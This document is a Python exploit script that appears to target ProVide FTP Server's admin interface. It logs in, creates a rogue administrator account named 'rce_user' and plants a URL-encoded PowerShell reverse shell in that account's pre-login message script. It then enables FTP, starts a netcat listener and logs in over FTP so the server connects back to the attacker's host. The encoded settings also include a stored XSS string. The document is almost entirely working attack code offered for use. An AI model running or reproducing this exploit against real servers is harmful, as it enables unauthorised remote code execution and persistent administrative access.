# Admin Interface Privilege Escalation/RCE

import argparse
import ipaddress
import os
import subprocess
import sys
import time
from ftplib import FTP, FTP_TLS

import pysftp
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def proxy(flag):
    return {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} if flag else None


def get_url(target, path=None):
    url = f"https://{target}:8443"
    if path:
        if not path.startswith("/"):
            path = f"/{path}"
    else:
        path = ""
    return f"{url}{path}"


def get_headers():
    return {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"
            }


def login(target, user, password, proxy_host=None):
    data = {"username": user, "password": password, "logon": ''}
    res = requests.post(get_url(target), headers=get_headers(), data=data, proxies=proxy_host, allow_redirects=False,
                        verify=False)
    return res.cookies


def create_user(target, cookies, local_host, local_port, proxy_host):
    user = "rce_user"
    password = "rce_pwd_123!"
    url = get_url(target, "/ajax/SetUserInfo")
    template = (
    "general=%7B%22OldUserName%22%3A%22%22%2C%22RealName%22%3A%22{0}%22%2C%22Pas"
    "sword%22%3A%22{1}%22%2C%22Administrator%22%3Atrue%2C%22UserName%22%3A%22{0}"
    "%22%2C%22GroupMembership%22%3A%22%22%7D&restrictions=%7B%22UserOverrideUTF8"
    "%22%3A%22%22%2C%22MaxBytesPerSecULUnit%22%3A1%2C%22MaxSimultaneousULEnabled"
    "%22%3Afalse%2C%22MaxBytesPerSecULEnabled%22%3Afalse%2C%22OverrideConcurrent"
    "LoginSettings%22%3Afalse%2C%22UserOverrideLoginLimit%22%3Afalse%2C%22MaxSim"
    "ultaneousLoginPerIP%22%3A0%2C%22OverrideSpeedLimitSettings%22%3Afalse%2C%22"
    "OverrideTransferLimitSettings%22%3Afalse%2C%22MaxBytesPerSecDLUnit%22%3A1%2"
    "C%22CachePassword%22%3Afalse%2C%22MaxSimultaneousLoginPerIPEnabled%22%3Afal"
    "se%2C%22ExpireRemoveEnabled%22%3Afalse%2C%22ExpireType%22%3A0%2C%22ExpireDa"
    "te%22%3A%222020-04-07%22%2C%22VirtualAccount%22%3Afalse%2C%22MaxSimultaneou"
    "sUL%22%3A0%2C%22MaxSimultaneousDL%22%3A0%2C%22MaxSimultaneousLogin%22%3A0%2"
    "C%22MaxSimultaneousLoginEnabled%22%3Afalse%2C%22ExpireEnabled%22%3Afalse%2C"
    "%22UserOverrideGlobalSpeedLimit%22%3Afalse%2C%22WindowsAccount%22%3Afalse%2"
    "C%22ExpireValue%22%3A0%2C%22OverrideUTF8%22%3Afalse%2C%22AccountDisabled%22"
    "%3Afalse%2C%22OverrideExpirationSettings%22%3Afalse%2C%22MaxBytesPerSecUL%2"
    "2%3A0%2C%22MaxBytesPerSecDL%22%3A0%2C%22MaxSimultaneousDLEnabled%22%3Afalse"
    "%2C%22MaxBytesPerSecDLEnabled%22%3Afalse%2C%22AllowAnonymousAccess%22%3Afal"
    "se%2C%22IgnoreSpeedLimitOnLocalNetwork%22%3Afalse%7D&security=%7B%22AccessA"
    "llowList%22%3A%22%22%2C%22RequirePubKey%22%3Afalse%2C%22OverridePubKeySetti"
    "ngs%22%3Afalse%2C%22AccessDenyList%22%3A%22%22%2C%22PubKey%22%3A%22%22%2C%2"
    "2SpecifyAccessDenyList%22%3Afalse%2C%22OverrideAccessSettings%22%3Afalse%2C"
    "%22SpecifyAccessAllowList%22%3Afalse%2C%22AllowPubKey%22%3Afalse%2C%22Requi"
    "rePasswordIfNoPubKey%22%3Afalse%7D&services=%7B%22AllowProVideLink%22%3Afal"
    "se%2C%22OverrideFTP%22%3Atrue%2C%22AllowTFTP%22%3Atrue%2C%22AllowSFTP%22%3A"
    "false%2C%22AllowFTPS%22%3Afalse%2C%22RequirePasswordReceive%22%3Afalse%2C%2"
    "2RequirePasswordShare%22%3Afalse%2C%22RequirePasswordCollaborate%22%3Afalse"
    "%2C%22AllowFTP%22%3Atrue%2C%22AllowHTTPS%22%3Afalse%2C%22AllowCollaborate%2"
    "2%3Afalse%2C%22OverrideHTTPS%22%3Afalse%2C%22AllowShare%22%3Afalse%2C%22Ove"
    "rrideTFTP%22%3Atrue%2C%22OverrideSFTP%22%3Afalse%2C%22OverrideFTPS%22%3Afal"
    "se%2C%22AllowManageFavorites%22%3Atrue%2C%22AllowReceive%22%3Afalse%7D&mess"
    "ages=%7B%22MsgOnCreateDirectory%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabl"
    "ed%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Requested+file+acti"
    "on+okay%2C+completed.%22%7D%2C%22MsgOnUploadStart%22%3A%7B%22ShowScript%22%"
    "3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22F"
    "ile+status+okay%3B+about+to+open+data+connection.%22%7D%2C%22MsgOnUploadEnd"
    "%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A"
    "%22%22%2C%22Text%22%3A%22Closing+data+connection.%22%7D%2C%22MsgOnDownloadE"
    "nd%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%"
    "3A%22%22%2C%22Text%22%3A%22Closing+data+connection.%22%7D%2C%22MsgOnRemoveD"
    "irectory%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Scri"
    "pt%22%3A%22%22%2C%22Text%22%3A%22Requested+file+action+okay%2C+completed.%2"
    "2%7D%2C%22MsgBeforeCreateDirectory%22%3A%7B%22ShowScript%22%3Atrue%2C%22Ena"
    "bled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%"
    "7D%2C%22MsgBeforeRename%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Af"
    "alse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22Msg"
    "BeforeRemoveDirectory%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afal"
    "se%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgOn"
    "Quit%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%2"
    "2%3A%22%22%2C%22Text%22%3A%22Goodbye.%22%7D%2C%22MsgOnCopy%22%3A%7B%22ShowS"
    "cript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%"
    "22%3A%22Requested+file+action+okay%2C+completed.%22%7D%2C%22MsgOnDownloadSt"
    "art%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22"
    "%3A%22%22%2C%22Text%22%3A%22File+status+okay%3B+about+to+open+data+connecti"
    "on.%22%7D%2C%22MsgBeforeUpload%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled"
    "%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2"
    "C%22MsgOnListDirectoryEnd%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%"
    "3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Closing+data+connection.%"
    "22%7D%2C%22MsgBeforeLoggedIn%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%2"
    "2%3Atrue%2C%22Script%22%3A%22%25EXECUTE(powershell+-exec+bypass+-nop+-comma"
    "nd+%5C%22%24client%3DNew-Object+System.Net.Sockets.TCPClient('{2}'%2C{3})%3"
    "B%24stream%3D%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%3D0..65535%7C"
    "%25%7B0%7D%3Bwhile((%24i+%3D+%24stream.Read(%24bytes%2C0%2C%24bytes.Length)"
    ")+-ne+0)%7B%3B%24data%3D(New-Object+-TypeName+System.Text.ASCIIEncoding).Ge"
    "tString(%24bytes%2C0%2C%24i)%3B%24sendback%3D(iex+%24data+2%3E%261%7COut-St"
    "ring)%3B%24sendback2%3D%24sendback%2B'PS+'%2B(pwd).Path+%2B+'%3E+'%3B%24sen"
    "dbyte%3D(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream"
    ".Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%5C%2"
    "2)%25%22%2C%22Text%22%3A%22Login+not+accepted%22%7D%2C%22MsgOnRename%22%3A%"
    "7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%"
    "2C%22Text%22%3A%22Requested+file+action+okay%2C+completed.%22%7D%2C%22MsgBe"
    "foreConnect%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Sc"
    "ript%22%3A%22%22%2C%22Text%22%3A%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%7"
    "D%2C%22MsgBeforeDownload%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3A"
    "false%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22Ms"
    "gOnChangeDirectory%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse"
    "%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22CWD+Command+successful.%22%7D%2C"
    "%22MsgOnConnect%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C"
    "%22Script%22%3A%22%22%2C%22Text%22%3A%22%25SW_NAME%25+v%25SW_VERSION%25%2C+"
    "build+%25SW_BUILD%25+ready.%22%7D%2C%22MsgOnListDirectoryStart%22%3A%7B%22S"
    "howScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22T"
    "ext%22%3A%22Opening+connection+for+%2Fbin%2Fls.%22%7D%2C%22MsgBeforeRemoveF"
    "ile%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%"
    "3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgBeforeChangeDirector"
    "y%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A"
    "%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgOnDisconnect%22%3A%7B%"
    "22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%"
    "22Text%22%3A%22%22%7D%2C%22MsgOnRemoveFile%22%3A%7B%22ShowScript%22%3Afalse"
    "%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Requeste"
    "d+file+action+okay%2C+completed.%22%7D%2C%22MsgBeforeCopy%22%3A%7B%22ShowSc"
    "ript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22"
    "%3A%22Access+denied%22%7D%2C%22MsgBeforeListDirectory%22%3A%7B%22ShowScript"
    "%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%"
    "22Access+denied%22%7D%2C%22MsgOnLoggedIn%22%3A%7B%22ShowScript%22%3Afalse%2"
    "C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22User+logge"
    "d+in%2C+proceed.%22%7D%7D&directories=%5B%22%2F%7CC%3A%5C%5C%7C%2CRF%2CLD%2"
    "CRR%2CAF%2CDF%2CWF%2CMD%2CDD%22%5D&statistics=%7B%22DownloadsFailed%22%3A0%"
    "2C%22BytesDownloaded%22%3A0%2C%22ClearGeneral%22%3Afalse%2C%22ClearDownload"
    "s%22%3Afalse%2C%22CreationDate%22%3A%222020-04-05+23%3A40%3A37%22%2C%22File"
    "sUploaded%22%3A0%2C%22LastKnownIP%22%3A%22127.0.0.1%22%2C%22LastLogin%22%3A"
    "%222020-04-07+00%3A34%3A54%22%2C%22ClearUploads%22%3Afalse%2C%22BytesUpload"
    "ed%22%3A0%2C%22FilesDownloaded%22%3A0%2C%22UploadsFailed%22%3A0%2C%22Logins"
    "%22%3A1%7D")
    data = template.format(user, password, local_host, local_port)
    res = requests.post(url, headers=get_headers(), cookies=cookies, data=data, proxies=proxy_host, allow_redirects=False,
                        verify=False)
    return res.status_code == 200

def enableFTP(target, cookie, proxy):
    url = get_url(target, "/ajax/SetFTPSettings")
    headers = get_headers()
    json={"AllowFXP": False, "Bindings": "21", "Enabled": True, "EnableSSLTLS": False, "ForcePROTP": False, "PassiveModeHost": "", "PassivePortMax": 3000, "PassivePortMin": 2048, "SpecifyPassiveModeHost": False, "SpecifyPassivePortRange": True, "SSLTLSMode": "Explicit"}
    res = requests.post(url, headers=headers, cookies=cookie, json=json, proxies=proxy, allow_redirects=False, verify=False)
    return res.status_code == 200


def trigger(target, trigger_type=None):
    if not trigger_type or trigger_type not in ["ftp", "ftps", "sftp"]:
        print("[*] No trigger type selected, using FTP")
        trigger_type = "ftp"
    try:
        if trigger_type == "ftp":
            with FTP(target, 'rce_user', 'rce_pwd_123!', timeout=20.0) as ftp:
                ftp.login()
        elif trigger_type == "ftps":
            with FTP_TLS(target, 'rce_user', 'rce_pwd_123!', timeout=20.0) as ftps:
                ftps.login()
        elif trigger_type == "sftp":
            with pysftp.Connection(host=target, username="rce_user", password="rce_pwd_123!") as sftp:
                sftp.listdir_attr()
    except Exception as e:
        print("[+] Check your shell")
        print(f"[-] {e}")


def exploit(target, user, password, local_host, local_port, trigger_type, proxy_host):
    print("[+] Logging in")
    cookies = login(target, user, password, proxy_host)
    if not cookies:
        print("[-] Could not login. Aborting.")
        sys.exit(1)
    time.sleep(2)
    print("[+] Creating Rogue User")
    create_user(target, cookies, local_host, local_port, proxy_host)
    print("[+] Enabling FTP")
    enableFTP(target, cookies, proxy_host)
    print("[+] Setting up listener")
    if not setup_listener(local_port):
        print("[-] Could not setup listener")
    time.sleep(2)
    print("[+] Triggering reverse shell")
    trigger(target, trigger_type=trigger_type)


def setup_listener(local_port):
    try:
        if os.name == "nt":
            subprocess.Popen(f'start "" "cmd /c nc.exe -L -p {local_port}', shell=True)
        else:
            subprocess.Popen(f"gnome-terminal -q -- nc -lvkkp {local_port} 2>/dev/null", shell=True)
    except Exception as e:
        print(f"[+] {e}. Done")
        return False
    finally:
        return True


def validate_ip(target):
    try:
        ipaddress.ip_address(target)
        return True
    except ValueError:
        return False


def main():
    parser = argparse.ArgumentParser(description='Trigger RCE on ProVide FTP Server')

    parser.add_argument(
        '-u', '--user', required=False, type=str, help='Username')
    parser.add_argument(
        '-p', '--password', required=False, type=str, help='Hashed Password')
    parser.add_argument(
        '-H', '--lhost', required=True, type=str, help='Local Listener IP Address')
    parser.add_argument(
        '-P', '--lport', required=True, type=str, default="443", help='Local Listener Port')
    parser.add_argument(
        '-x', '--proxy', required=False, action="store_true", help='Proxy (for debugging)')
    parser.add_argument(
        '-d', '--debug', required=False, action="store_true", help='Enable debug output')
    parser.add_argument(
        '-f', '--trigger', required=False, choices=["ftp", "ftps", "sftp"], default="ftp", help='Trigger type')
    parser.add_argument(
        '-t', '--target', required=True, type=str, default=None, help='Target Base URL')

    args = parser.parse_args()

    if validate_ip(args.target):
        exploit(args.target, args.user, args.password, args.lhost, args.lport, args.trigger, proxy(args.proxy))
    else:
        print("[-] Invalid Target IP")

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    main()
